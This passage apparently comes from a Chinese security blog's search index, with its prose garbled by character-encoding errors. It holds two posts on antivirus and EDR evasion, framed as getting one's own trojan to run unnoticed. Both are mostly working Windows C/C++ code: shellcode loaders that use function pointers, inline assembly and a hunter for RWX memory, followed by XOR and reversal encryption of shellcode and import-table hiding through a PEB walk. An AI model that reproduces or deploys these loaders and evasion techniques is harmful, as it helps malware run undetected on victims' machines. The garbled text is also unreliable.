(*)()) (void*)buf;(int)(*func)(); // å¦ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆè¿è¡Œæ–¹å¼// (*(int(*)()) buf)();// sleep for a secondSleep(1000);return 0;&#125; è¿™æ®µä»£ç å°±å®ç°äº†å°†shellcodeçš„åœ°å€ä½œä¸ºå‡½æ•°å»æ‰§è¡Œã€‚ä½†shellcodeæ­¤æ—¶åœ¨å†…å­˜ä½œä¸ºè°ƒè¯•æŒ‡ä»¤ï¼Œå¹¶æ²¡æœ‰å°è¯•æ‰§è¡Œä»»ä½•éæ³•å†…å­˜åŒºåŸŸçš„ä»£ç ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè§¦å‘DEPã€‚å¦‚æœshellcodeä¸­åŒ…å«äº†çœŸæ­£çš„æ¶æ„ä»£ç ï¼Œå¯èƒ½ä¼šå°è¯•æ‰§è¡Œæˆ–ä¿®æ”¹å†…å­˜ä¸­çš„æ•æ„ŸåŒºåŸŸï¼Œè¿™æ—¶åº”è¯¥å°±ä¼šè§¦å‘DEPã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®&#x2F;NXCOMPATï¼šNOæ ‡å¿—æ¥ç®€å•åœ°ä¸ºå·²ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶ç¦ç”¨DEPï¼ˆå¯¹äºVisualStudioï¼Œå¯ä»¥åœ¨é«˜çº§é“¾æ¥å™¨é€‰é¡¹ä¸­è®¾ç½®ï¼‰ã€‚è¿™æ ·ï¼Œshellcodeå°±ä¼šè¢«é¡ºåˆ©çš„æ‰§è¡Œã€‚ é€šè¿‡è¿™ç§åŠ è½½æ–¹å¼ï¼Œå¯ä»¥ç”¨æ¥é¿å…AV&#x2F;DERçš„æ£€æµ‹ï¼Œå¹¶ä¸”è¿™ç§æ–¹å¼åŠ è½½ï¼Œshellcodeä¼šåœ¨æ ˆä¸Šä½œä¸ºå±€éƒ¨å˜é‡åˆ†é…ï¼Œæ ˆæ˜¯å¯è¯»å¯å†™çš„ï¼Œå°±å…è®¸æˆ‘ä»¬åœ¨è¿™ä¸ªå†…å­˜åŒºåŸŸä¸­å¯¹shellcodeè¿›è¡ŒåŠ å¯†ã€‚ ç¼ºç‚¹DEPä¼šé˜»æ­¢æ ˆä¸­ä»£ç çš„æ‰§è¡Œï¼Œéœ€è¦åœ¨æ²¡æœ‰DEPæ”¯æŒçš„æƒ…å†µä¸‹ç¼–è¯‘ä»£ç ã€‚ .Textæ®µåŠ è½½æ¦‚å¿µä»£ç æ®µå­˜åœ¨å¯æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥æ— éœ€æ‹…å¿ƒDEPæŠ›å‡ºå¼‚å¸¸ï¼Œé—®é¢˜åœ¨äºå¦‚ä½•å°†shellcodeæ”¾ç½®å’Œæ‰§è¡Œåœ¨ä»£ç æ®µã€‚é¦–å…ˆAPIå‡½æ•°ä¸å¯ç”¨ï¼Œå› ä¸ºä»£ç æ®µæ˜¯æ²¡æœ‰å†™æƒé™çš„ï¼›å‡½æ•°æŒ‡é’ˆä¹Ÿç”¨ä¸ä¸Šï¼Œå°†ä½äºæ•°æ®æ®µçš„shellcodeè½¬ä¸ºå‡½æ•°æŒ‡é’ˆæ¥æ‰§è¡Œä¹Ÿä¾ç„¶åœ¨æ•°æ®æ®µä¸­ã€‚é‚£ä¹ˆè¿˜æœ‰å†…è”æ±‡ç¼–è¿™ä¸ªåŠæ³•å¯ä»¥ä½¿ç”¨ã€‚ ä»£ç ï¼š 123456#include &lt;Windows.h&gt;int main() &#123;asm(&quot;.byte 0xde,0xad,0xbe,0xef,0x00\\n\\t&quot;&quot;ret\\n\\t&quot;);return 0;&#125; æ­¤ä»£ç æ˜¯é¡¹ç›®ä¸­çš„ä¸€ä¸ªdemoï¼Œä½¿ç”¨Gccç¼–è¯‘ç¯å¢ƒå°±å¯ä»¥ç¼–è¯‘è¿è¡Œäº†ã€‚ å› ä¸ºæ²¡æœ‰APIè°ƒç”¨ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥é¿å…AV&#x2F;EDRçš„æ£€æµ‹ã€‚ ç¼ºç‚¹ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼Œå› ä¸ºæ²¡æœ‰å¯å†™æƒé™ï¼Œæ‰€ä»¥æ²¡æœ‰åŠ å¯†è¿‡çš„shellcodeå¾ˆå®¹æ˜“å°±ä¼šè¢«æ£€æµ‹å‡ºæ¥ã€‚ä¸ºäº†é¿å…è¢«æ£€æµ‹å¯ä»¥åœ¨å†…è”æ±‡ç¼–ä¸­è¿›è¡Œä»£ç çš„åŠ å¯†å’Œè§£å¯†ã€‚ RWX-Hunteræ¦‚å¿µæ„æ€å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯å»å¯»æ‰¾å†…å­˜ä¸­è¢«æ ‡è®°ä¸ºR-W-Xçš„åŒºåŸŸï¼Œæ—¢é¿å…äº†ä½¿ç”¨é«˜å±APIå¼€è¾Ÿç©ºé—´ï¼Œä¹Ÿæ— éœ€æ‹…å¿ƒä¼šè§¦å‘DEPè­¦å‘Šã€‚ä½†è¿™é‡Œè¿˜æœ‰å¾ˆå¤šé—®é¢˜éœ€è¦è€ƒè™‘ã€‚ å¦‚ä½•æŸ¥æ‰¾å¯æ‰§è¡Œçš„å†…å­˜åŒºåŸŸï¼› å¦‚ä½•å°†shellcodeæ”¾å…¥æ­¤å†…å­˜ï¼› å¦‚ä½•å°†ä»£ç æ‰§è¡Œæµè¿è¡Œåˆ°æ­¤å¤„ã€‚ è¿›ç¨‹4Gçš„è™šæ‹Ÿå†…å­˜ï¼ŒèŒƒå›´ä»0x00000000åˆ°0x7fffffffï¼Œæœç´¢èŒƒå›´å°±å¯ä»¥ç¡®å®šä¸‹æ¥ï¼Œç”¨VirtualQueryExæŸ¥è¯¢ä»0å¼€å§‹çš„å†…å­˜ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥åˆ¤æ–­æ˜¯å¦ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŒºåŸŸï¼Œå¦‚æœæ‰¾åˆ°å°±å¯ä»¥å†™å…¥shellcodeï¼Œæˆ‘ä»¬å¯ä»¥ç”¨APIæ¥è§£å†³å†™å…¥è¿™ä¸ªé—®é¢˜ï¼Œæˆ–è€…ä½¿ç”¨å‡½æ•°æŒ‡é’ˆä¹Ÿå¯ä»¥ã€‚æœ€åæ‰§è¡Œä¹Ÿå¯ä»¥è€ƒè™‘APIå‡½æ•°æˆ–è€…å‡½æ•°æŒ‡é’ˆæ¥è°ƒç”¨shellcodeæ‰§è¡Œã€‚ ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;psapi.h&gt;#include &lt;tchar.h&gt;LPVOID Hunt(DWORD processID)&#123; HMODULE hMod; DWORD cbNeeded; TCHAR szProcessName[MAX_PATH] = TEXT(&quot;&lt;unknown&gt;&quot;); //è·å–ç›®æ ‡è¿›ç¨‹å¥æŸ„ HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processID); if (EnumProcessModules(process, &amp;hMod, sizeof(hMod), &amp;cbNeeded)) &#123; //æšä¸¾æŒ‡å®šè¿›ç¨‹çš„æ¨¡å—ï¼Œå¹¶è·å–æ¯ä¸ªæ¨¡å—çš„åŸºæœ¬ä¿¡æ¯ GetModuleBaseName(process, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR)); &#125; if (process) &#123; _tprintf(TEXT(&quot;[*] Searching in %s (PID: %u)...&quot;), szProcessName, processID); long MaxAddress = 0x7fffffff; long address = 0; int c = 0; do &#123; //MEMORY_BASIC_INFORMATION ç»“æ„ä½“m MEMORY_BASIC_INFORMATION m; //VirtualQueryEx å‡½æ•°æ¥æŸ¥è¯¢æŒ‡å®šè¿›ç¨‹ä¸­ä» address å¼€å§‹çš„å†…å­˜ä¿¡æ¯ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ç»“æ„ä½“m int result = VirtualQueryEx(process, (LPVOID)address, &amp;m, sizeof(MEMORY_BASIC_INFORMATION)); //åˆ¤æ–­m.AllocationProtect æ˜¯å¦ç­‰äºPAGE_EXECUTE_READWRITE if (m.AllocationProtect == PAGE_EXECUTE_READWRITE) &#123; printf(&quot;RWX found at 0x%x\\n&quot;, m.BaseAddress); return m.BaseAddress; &#125; else if( c &gt; 50000 )&#123; printf(&quot;Still Hunting&quot;); c = 0; &#125; else &#123; c += 1; &#125; //å¦‚æœæ‰¾åˆ°è¯¥ç©ºé—´ï¼Œåˆ™è¿”å›è¯¥ç©ºé—´ if (address == (long)m.BaseAddress + (long)m.RegionSize) break; //å¦åˆ™å°†ä¸‹ä¸€ä¸ªæœç´¢åœ°å€è®¾ç½®ä¸ºä¸‹ä¸€ä¸ªå­˜å‚¨åŒºåŸŸ(åŸºåœ°å€+å†…å­˜åŒºåŸŸ)ã€‚ address = (long)m.BaseAddress + (long)m.RegionSize; &#125; while (address &lt;= MaxAddress); printf(&quot;Nope\\n&quot;); &#125; else &#123; _tprintf(TEXT(&quot;[*] No Access for %s (PID: %u) \\n&quot;), szProcessName, processID); &#125; return 0;&#125;void Exec(LPVOID address, DWORD processID)&#123; printf(&quot;[*] Exec Shellcode... &quot;); // msfvenom -p windows/x64/exec CMD=&#x27;&quot;C:\\Windows\\System32\\cmd.exe&quot;&#x27; EXITFUNC=thread --platform Windows -f c char shellcode[] = &quot;&quot;; //æ‰“å¼€å½“å‰è¿›ç¨‹ HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID); //å†™å…¥shellcode WriteProcessMemory(procHandle, address, shellcode, sizeof(shellcode), 0); //è¿è¡Œshellcode hThread = CreateThread(0, 0, (LPVOID)(address), NULL, 0, 0); printf(&quot;Done \\n&quot;);&#125;int main()&#123; printf(&quot;Starting Search \\n&quot;); //æœç´¢çš„èµ·å§‹åœ°å€ LPVOID spaceAddress = 0; //å½“å‰è¿›ç¨‹PID DWORD currentProc = GetCurrentProcessId(); printf(&quot;Current PID: %d&quot;, (int)currentProc); //è·å–RWXåœ°å€ spaceAddress = Hunt(currentProc); if (spaceAddress &gt; 0) &#123; //æ‰§è¡Œshellcode Exec(spaceAddress, currentProc); &#125; else&#123; printf(&quot;Error!&quot;); &#125; Sleep(10000); return 0;&#125; ä»£ç å€Ÿé‰´äºhttps://github.com/csandker/inMemoryShellcode.git ç¼ºç‚¹æ— æ³•ç»•è¿‡ä»£ç æ‰§è¡Œæ—¶çš„é«˜å±APIå‡½æ•°ï¼Œä½†ä¹Ÿè®¸åœ¨å…³è”æ£€æŸ¥æ—¶å¯ä»¥ç»•è¿‡ä¸€äº›AV&#x2F;EDRã€‚å†è¿›é˜¶ä¸€ä¸‹ï¼Œä½¿ç”¨APIéšè—æŠ€æœ¯è¿›è¡ŒAPIçš„è°ƒç”¨ï¼Œæˆ–è®¸å¯ä»¥å…æ€ç»•è¿‡ã€‚","categories":[{"name":"bypass","slug":"bypass","permalink":"https://e1ectr0nlc.github.io/categories/bypass/"}],"tags":[]},{"title":"å…æ€åˆæ¢","slug":"å…æ€å­¦ä¹ æ€»ç»“ä¸åç»­å­¦ä¹ ","date":"2023-11-11T16:00:00.000Z","updated":"2024-05-12T13:00:49.206Z","comments":true,"path":"2023/11/12/å…æ€å­¦ä¹ æ€»ç»“ä¸åç»­å­¦ä¹ /","permalink":"https://e1ectr0nlc.github.io/2023/11/12/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E4%B8%8E%E5%90%8E%E7%BB%AD%E5%AD%A6%E4%B9%A0/","excerpt":"åœ¨æˆ‘åˆå­¦å…æ€æ—¶ï¼Œä¹Ÿè‡ªå·±æ‰‹åŠ¨å®ç°äº†ä¸€ä¸ªç¨‹åºï¼Œä¸è¿‡è¿˜æ˜¯æ²¡æœ‰é€ƒè¿‡æ€æ¯’è½¯ä»¶çš„è¯†åˆ«ğŸ˜€ã€‚ä»Šå¤©å°±å…ˆæ¥æ€»ç»“ä¸€ä¸‹å·²ç»å­¦ä¹ è¿‡çš„çŸ¥è¯†ï¼Œé¿å…å¿˜è®°ã€‚","text":"åœ¨æˆ‘åˆå­¦å…æ€æ—¶ï¼Œä¹Ÿè‡ªå·±æ‰‹åŠ¨å®ç°äº†ä¸€ä¸ªç¨‹åºï¼Œä¸è¿‡è¿˜æ˜¯æ²¡æœ‰é€ƒè¿‡æ€æ¯’è½¯ä»¶çš„è¯†åˆ«ğŸ˜€ã€‚ä»Šå¤©å°±å…ˆæ¥æ€»ç»“ä¸€ä¸‹å·²ç»å­¦ä¹ è¿‡çš„çŸ¥è¯†ï¼Œé¿å…å¿˜è®°ã€‚ å¤§è‡´äº†è§£é¦–å…ˆåšå…æ€æ˜¯ä¸ºäº†ä»€ä¹ˆï¼Œè‚¯å®šæ˜¯æˆ‘ä»¬æƒ³è®©æˆ‘ä»¬çš„æœ¨é©¬å¯ä»¥è¿è¡Œè€Œä¸”ä¸è¢«æ€è½¯è¯†åˆ«ã€‚æˆ‘ä»¬çš„æœ¨é©¬æ˜¯ä»€ä¹ˆï¼Ÿå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨MSFæˆ–è€…CSç”Ÿæˆçš„shellcodeï¼Œé‚£ä¹ˆå°±å¼•è¿›æ¥äº†ä¸€ä¸ªé‡è¦æ¦‚å¿µï¼šshellcodeã€‚ è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»ç”Ÿæˆshellcodeçš„å·¥å…·äº†ï¼Œå·²ç»æœ‰å¾ˆå¤šæ•™ç¨‹è¯¦ç»†ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨ï¼Œç”Ÿæˆshellcodeåï¼Œè¿˜éœ€è¦ä¸€ä¸ªshellcodeloaderï¼Œç”¨æ¥åŠ è½½shellcodeï¼Œä¸ç„¶å•æŒ‡æœ›ä¸€ä¸ªshellcodeå°±å¯ä»¥åˆ°è¾¾æˆ‘ä»¬è¿œç¨‹æ§åˆ¶çš„ç›®çš„ï¼Œå®åœ¨æ˜¯æœ‰äº›å°çœ‹å„å¤§å®‰å…¨å‚å•†æ‰€ä»˜å‡ºçš„åŠªåŠ›äº†ã€‚è¿™é‡Œå°±åˆç»•å›åˆ°å…æ€ä¸Šæ¥äº†ï¼Œæˆ‘ä»¬çš„shellcodeloaderå¦‚ä½•æ‰èƒ½ä¸è¢«å„å®¶å®‰å…¨å‚å•†çš„è¯†åˆ«ä¸ºæœ¨é©¬ç¨‹åºï¼Œå°±æ˜¯æˆ‘ä»¬å­¦ä¹ çš„é‡ç‚¹ã€‚ æ€»ç»“ä¸€ä¸‹è¿™ä¸€éƒ¨åˆ†çš„é‡ç‚¹ï¼šshellcodeçš„ç”Ÿæˆã€shellcodeloaderçš„å…æ€ã€‚ æ£€æµ‹æ–¹æ³•ä¿—è¯è¯´çŸ¥å·±çŸ¥å½¼ï¼Œç™¾æˆ˜ç™¾èƒœã€‚æˆ‘ä»¬åªæœ‰çŸ¥é“å„å¤§å®‰å…¨å‚å•†æ˜¯å¦‚ä½•å¤§è‡´æ£€æµ‹æœ¨é©¬ç¨‹åºï¼Œæ‰èƒ½æœ‰é’ˆå¯¹çš„è¿›è¡Œç»•è¿‡ã€‚ åŸºäºç‰¹å¾ç çš„æ‰«æè¿™ä¸ªä¸éš¾ç†è§£ï¼Œå¯¹æ–‡ä»¶æˆ–å†…å­˜ä¸­çš„å­˜åœ¨çš„ç‰¹å¾åšæ£€æµ‹ï¼Œåƒå­—ç¬¦ä¸²æˆ–è€…é«˜å±APIå‡½æ•°ã€‚æ£€æµ‹æ–¹æ³•æ˜¯åšæ¨¡ç³Šå“ˆå¸Œæˆ–è€…æœºå™¨å­¦ä¹ è·‘æ¨¡å‹ï¼Œå†…éƒ¨åº”è¯¥æ˜¯ä¸€ç§ç´¯è®¡è®¡æ•°æ–¹å¼ä¸ºç¨‹åºè¿›è¡Œæ£€æµ‹ï¼Œç­‰å±é™©å‡½æ•°æˆ–å­—ç¬¦ä¸²ç´¯ç§¯åˆ°ä¸€å®šé˜ˆå€¼ï¼Œå°±æŠ¥è­¦ã€‚è¿™ç§æ–¹æ³•å‡†ç¡®åº¦å¾ˆé«˜ï¼Œä½†æ˜¯å¾ˆéš¾é’ˆå¯¹æœªçŸ¥çš„æœ¨é©¬ã€‚ å…³è”æ£€æµ‹è¿™ä¸ªå°±å¾ˆéš¾è¯´æ˜ç™½äº†ã€‚æœ‰å¯èƒ½æ£€æµ‹shellcodeçš„ç‰¹å¾ï¼Œæˆ–è€…ä¹Ÿå¯èƒ½æ˜¯ä¸€ç»„å…³è”çš„ä»£ç ï¼ŒæŠŠä¸€ç»„å…³è”ä¿¡æ¯ä½œä¸ºç‰¹å¾ã€‚æŒ‰ç…§æˆ‘çš„ç†è§£æ¥è¯´ï¼Œè¿™ä¸ªå…³è”ç‰¹å¾åº”è¯¥ä¸shellcodeçš„åŠ è½½æœ‰å…³ï¼Œæ¯”å¦‚ä½¿ç”¨è¿œç¨‹çº¿ç¨‹åŠ è½½æŠ€æœ¯æ—¶ï¼Œå°±ä¸å¯é¿å…çš„ä½¿ç”¨ä¸€äº›APIå‡½æ•°ï¼Œå½“è¿™äº›APIå‡½æ•°å•ç‹¬å‡ºç°ä¸ä¼šæŠ¥è­¦ï¼Œä½†è¦æ˜¯ä¸€èµ·å‡ºç°å°±å¯èƒ½è¢«å½“ä½œæœ¨é©¬ã€‚ æ²™ç®±æˆ‘è§‰å¾—æ²™ç®±åº”è¯¥å’Œè¡Œä¸ºæ£€æµ‹æ˜¯ä¸€ç§ç±»å‹ã€‚å¯åŠ¨ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒç»™ç–‘ä¼¼æœ¨é©¬çš„ç¨‹åºè¿è¡Œï¼Œæä¾›å®ƒå¯èƒ½ç”¨åˆ°çš„ä¸€åˆ‡å…ƒç´ ï¼ŒåŒ…æ‹¬ç¡¬ç›˜ï¼Œç«¯å£ç­‰ï¼Œè®©å®ƒåœ¨å…¶ä¸Šè‡ªç”±å‘æŒ¥ï¼Œæœ€åæ ¹æ®å…¶è¡Œä¸ºæ¥åˆ¤å®šæ˜¯å¦ä¸ºç—…æ¯’ã€‚ä¸»è¦é’ˆå¯¹çš„å°±æ˜¯å˜å½¢æœ¨é©¬ã€‚ å¦‚ä½•ç»•è¿‡é’ˆå¯¹ä¸Šè¿°æ£€æµ‹æ–¹æ³•ï¼Œæœ‰è®¸å¤šå¤§ä½¬å­œå­œä¸å€¦çš„å¼€å‘å‡ºäº†è®¸å¤šæ–¹æ³•è¿›è¡Œç»•è¿‡ã€‚æœ¬äººä¹Ÿä¸è¿‡åœ¨è¿™é‡Œæ‹¾äººç‰™æ…§ï¼Œç•¥åšæ€»ç»“ã€‚ é’ˆå¯¹ç‰¹å¾ç æ£€æµ‹åŠ å¯†shellcodeæ—¢ç„¶ä½ å¯ä»¥åœ¨æ–‡ä»¶ä¸­é€šè¿‡æˆ‘çš„shellcodeå’Œç¡¬ç¼–ç çš„å­—ç¬¦ä¸²æ£€æµ‹åˆ°æˆ‘ï¼Œé‚£ä¹ˆæˆ‘å°±å˜å½¢ï¼Œæ¶ˆé™¤ç‰¹å¾ã€‚å…·ä½“æ“ä½œå°±æ˜¯å¯¹shellcodeå’Œç¡¬ç¼–ç å­—ç¬¦ä¸²è¿›è¡Œå¼‚æˆ–ã€ç¼–ç æˆ–è€…åŠ å¯†ï¼Œç­‰æˆ‘åˆ°å†…å­˜ä¸­è‡ªè§£å¯†ï¼Œä¸å½±å“ç¨‹åºæ­£å¸¸æ‰§è¡Œã€‚ä½†æ˜¯è¦æ³¨æ„åŠ å¯†æ“ä½œå¯èƒ½å½±å“æ–‡ä»¶ä¿¡æ¯ç†µçš„å¢åŠ ï¼Œç¬”è€…æ›¾ç»åœ¨æŸä½å¤§ä½¬çš„åšå®¢ä¸­è§åˆ°æœ‰äº›æ€è½¯ä¼šæ£€æµ‹ä¿¡æ¯ç†µçš„å¤§å°ï¼Œå¦‚æœè¿‡é«˜ä¹Ÿä¼šå®šä¹‰ä¸ºæœ¨é©¬ç¨‹åºã€‚ ä»£ç å®ç°ï¼ˆvs2017ï¼‰ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include&lt;Windows.h&gt;#include&lt;string.h&gt;unsigned char shellcode[] =&#123; //ä½ çš„shellcode&#125;; void xorcode(char *shellBuffer, int nlength, int key)&#123; int i = 0; for (i = 0; i &lt; nlength; i++) &#123; shellBuffer[i] ^= key; &#125;&#125;void recode(char*szBuffer, int nLength)&#123; char *szTemp = new char[nLength] &#123;0&#125;; int count = nLength - 1; for (int i = 0; i &lt; count; i++) szTemp[count - i] = szBuffer[i]; for(size_t i = 0; i &lt;=count; i++) szBuffer[i]=szTemp[i];&#125;void WriteToFile(const char*szPath, char*szBuffer, int nLength)&#123; HANDLE hFile = CreateFileA(szPath, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); DWORD lpNumberOfBytesWritten = 0; BOOL bRet = WriteFile(hFile, szBuffer, nLength, &amp;lpNumberOfBytesWritten, NULL); if (bRet) std::cout &lt;&lt; &quot;WriteFile Success!&quot; &lt;&lt; std ::endl; else std::cout &lt;&lt; &quot;WriteFile Failed!&quot; &lt;&lt; std :: endl;&#125;int main()&#123; recode((char*)&amp;shellcode, sizeof(shellcode)); //å°†shellcodeå€’å™ xorcode((char*)&amp;shellcode, sizeof(shellcode), 0x75);//å¼‚æˆ–shellcode WriteToFile(&quot;D:\\\\shellcode.ini&quot;, (char*)&amp;shellcode, sizeof(shellcode));//å°†shellcodeå†™å…¥shellcode.iniä¸­ return 0;&#125;//W-------------------------------------æˆ‘æ˜¯åˆ†å‰²çº¿--------------------------------------Wè¿™æ®µä»£ç æ˜¯å¯¹åº”çš„shellcodeloaderç¨‹åºçš„mainå‡½æ•°ï¼Œå…ˆè§£å¯†ï¼Œå†åœ¨å½“å‰è¿›ç¨‹åˆ†é…å†…å­˜ç©ºé—´ï¼Œå†™å…¥shellcoedï¼Œæ¥ç€åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œèµ·å§‹åœ°å€ä¸ºåˆ†é…ç©ºé—´çš„åœ°å€ï¼Œæ‰§è¡Œshellcode//int main()//&#123;//// xorcode((char*)&amp;shellcode, sizeof(shellcode), 0x75);// recode((char*)&amp;shellcode, sizeof(shellcode));// LPVOID lpBuffer = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);// SIZE_T lpNumberOfBytesWritten = 0;// WriteProcessMemory(GetCurrentProcess(), lpBuffer, shellcode, sizeof(shellcode), &amp;lpNumberOfBytesWritten);// HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);// if (hThread != NULL) &#123;// printf(&quot;success&quot;);// &#125;// else &#123;// printf(&quot;error&quot;);// &#125;// WaitForSingleObject(hThread, INFINITE);// return 0;//&#125; é€šè¿‡ä¸Šè¿°ä»£ç å°±å¯ä»¥å°†ä½ çš„shellcodeè¿›è¡Œç®€å•åŠ å¯†ï¼Œå½“åœ¨shellcodeloaderä¸­åŠ è½½shellcodeçš„æ—¶å€™ä¹Ÿè¦å…ˆè§£å¯†å†è¿è¡Œã€‚ shellcodeåˆ†ç¦»è¿™ç§æ€è·¯æ˜¯ä½ æ—¢ç„¶ä»ç¨‹åºä¸­æ£€æµ‹åˆ°æˆ‘çš„shellcodeï¼Œé‚£ä¹ˆæˆ‘å°±ä¸æŠŠshellcodeå†™è¿›ç¨‹åºä¸­ï¼Œè€Œæ˜¯é€šè¿‡ç½‘ç»œè¿æ¥è¿œç¨‹è¯»å–ç¨‹åºè·å–sehllcodeï¼Œå†æ‰§è¡Œshellcodeã€‚ç”±äºç¬”è€…æ²¡æœ‰é©¬å†…ä¹°ä¸èµ·æœåŠ¡å™¨ï¼Œæ‰€ä»¥æš‚æ—¶æ²¡æœ‰å®ç°shellcodeåˆ†ç¦»çš„ä»£ç ã€‚ åŠ å£³å…æ€ä¸€äº›åŠ å£³è½¯ä»¶å¯¹ç¨‹åºåŠ å£³åï¼ŒåŸºæœ¬å¯ä»¥å®ç°ç‰¹å¾ç çš„è¦†ç›–ã€‚è¿™é‡ŒæŒ‡çš„åŠ å£³è½¯ä»¶æ˜¯åŠ å¯†å£³ï¼Œæœ¬è´¨è¿˜æ˜¯å¯¹shellcodeè¿›è¡ŒåŠ å¯†æ¥éšè—ç‰¹å¾ã€‚è¿™é‡Œç¬”è€…ä¹Ÿæ²¡æœ‰åšè¿‡å°è¯•ï¼Œæ˜¯ç†è®ºå¯è¡Œçš„èŒƒå›´ã€‚ é’ˆå¯¹å…³è”æ£€æµ‹éšè—IATå½“æˆ‘ä»¬è°ƒç”¨APIæ—¶å¯ä»¥åœ¨å¯¼å…¥è¡¨ä¸­æ˜æ˜¾çœ‹åˆ°ï¼Œè¿™å¯¹äºæœ¨é©¬ç¼–å†™è€…æ¥è¯´è‚¯å®šæ˜¯ä¸€å¤§è´¥ç¬”ï¼Œå› ä¸ºåç—…æ¯’äººå‘˜å¾ˆè½»æ¾å°±èƒ½çœ‹åˆ°ä½ æœ‰æ²¡æœ‰è°ƒç”¨å¯ç–‘å‡½æ•°è¿›è¡Œä¸€è¿ä¸²çš„æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦éšè—æˆ‘ä»¬çš„å¯¼å…¥å‡½æ•°ã€‚ ä»£ç å®ç°ï¼ˆvs2017ï¼‰ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;iostream&gt;#include &lt;Windows.h&gt;// è·å– Kernel32.dll çš„åŸºå€DWORD GetKernel32Address()&#123; // ä½¿ç”¨æ±‡ç¼–è·å– TEB å’Œ PEB ç»“æ„ï¼Œä»è€Œè·å– Kernel32.dll çš„åŸºå€ DWORD dwKernel32Addr = 0;_asm &#123; push eax mov eax, dword ptr fs:[0x30] mov eax, [eax + 0x0c] mov eax, [eax + 0x1C] mov eax, [eax] mov eax, [eax + 0x08] mov dwKernel32Addr, eax pop eax&#125;return dwKernel32Addr;&#125;DWORD MyGetProcAddress()&#123; DWORD dwAddrBase =GetKernel32Address();// è·å– Kernel32.dll çš„åŸºå€ PIMAGE_DOS_HEADER pDos=(PIMAGE_DOS_HEADER)dwAddrBase;// è½¬æ¢ä¸º DOS å¤´æŒ‡é’ˆ PIMAGE_NT_HEADERS pNt=(PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew +dwAddrBase);// è½¬æ¢ä¸º NT å¤´æŒ‡é’ˆ PIMAGE_DATA_DIRECTORY pDataDir= pNt-&gt;OptionalHeader.DataDirectory+IMAGE_DIRECTORY_ENTRY_EXPORT;// è·å–å¯¼å‡ºè¡¨æ•°æ®ç›®å½• PIMAGE_EXPORT_DIRECTORY pExport=(PIMAGE_EXPORT_DIRECTORY)(dwAddrBase+pDataDir-&gt;VirtualAddress);// è·å–å¯¼å‡ºè¡¨ DWORD dwFunCount= pExport-&gt;NumberOfFunctions;// å¯¼å‡ºå‡½æ•°è¡¨æ•°é‡ DWORD dwFunNameCount =pExport-&gt;NumberOfNames;// å¯¼å‡ºå‡½æ•°åæ•°é‡ PDWORD pAddrOfFun=(PDWORD)(pExport-&gt;AddressOfFunctions+dwAddrBase);// å‡½æ•°åœ°å€è¡¨æŒ‡é’ˆ PDWORD pAddrOfNames=(PDWORD)(pExport-&gt;AddressOfNames+dwAddrBase);// å‡½æ•°åè¡¨æŒ‡é’ˆ PWORD pAddrOfOrdinals=(PWORD)(pExport-&gt;AddressOfNameOrdinals+dwAddrBase);// åºå·è¡¨æŒ‡é’ˆ for (size_t i = 0; i&lt; dwFunCount; i++)// éå†å¯¼å‡ºå‡½æ•°è¡¨ &#123; if (!pAddrOfFun[i])// å¦‚æœå‡½æ•°åœ°å€ä¸º0ï¼Œè·³è¿‡ continue; DWORD dwFunAddrOffset =pAddrOfFun[i];// è·å–å½“å‰å‡½æ•°åœ°å€åç§» for (size_t j = 0; j &lt; dwFunNameCount; j++)// éå†å¯¼å‡ºå‡½æ•°åè¡¨ &#123; if (pAddrOfOrdinals[j] == i)// å¦‚æœåºå·è¡¨ä¸­çš„åºå·ç­‰äºå½“å‰ç´¢å¼• &#123; DWORD dwNameOffset = pAddrOfNames[j];// è·å–å‡½æ•°ååç§» char *pFuncName = (char *)(dwAddrBase + dwNameOffset);// è·å–å‡½æ•°ååœ°å€ if (strcmp(pFuncName, &quot;GetProcAddress&quot;) == 0)// å¦‚æœå‡½æ•°ååŒ¹é… GetProcAddress return dwFunAddrOffset + dwAddrBase;// è¿”å› GetProcAddress åœ°å€ &#125; &#125; &#125;&#125;// è‡ªå®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹//LoadLibraryEXTERN_C typedef HMODULE(WINAPI *fnLoadLibraryA)( _In_ LPCSTR lpLibFileName);//GetProcAddressEXTERN_C typedef WINBASEAPIFARPROC(WINAPI *fnGetProcAddress) ( _In_ HMODULE hModule, _In_ LPCSTR lpProcName);//MessageBoxAEXTERN_C typedef int(WINAPI * fnMessageBoxA)( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);//ExitProcessEXTERN_C typedef VOID(WINAPI 